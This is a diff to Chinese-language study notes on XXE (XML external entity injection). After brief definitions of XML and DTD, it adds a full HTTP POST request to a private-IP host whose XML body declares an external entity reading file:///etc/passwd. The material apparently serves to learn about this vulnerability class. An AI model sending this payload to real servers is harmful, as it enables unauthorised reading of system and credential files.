@@ -8,3 +8,28 @@ XXE全称是——XML External Entity,也就是XML外部实体注入攻击.漏�
 - XML是一种标记语言，被无数软件项目采用
 - DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。
 - DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
+- POST /xml.php HTTP/1.1
+
+Host: 10.12.11.50
+
+User-Agent: python-requests/2.18.4
+
+Accept-Encoding: gzip, deflate
+
+Accept: */*
+
+Connection: close
+
+Content-Length: 137
+
+Content-Type: application/x-www-form-urlencoded
+
+
+
+<?xml version="1.0" encoding="utf-8"?> 
+
+<!DOCTYPE creds [  
+
+<!ENTITY goodies SYSTEM "file:///etc/passwd"> ]> 
+
+<creds>&goodies;</creds>
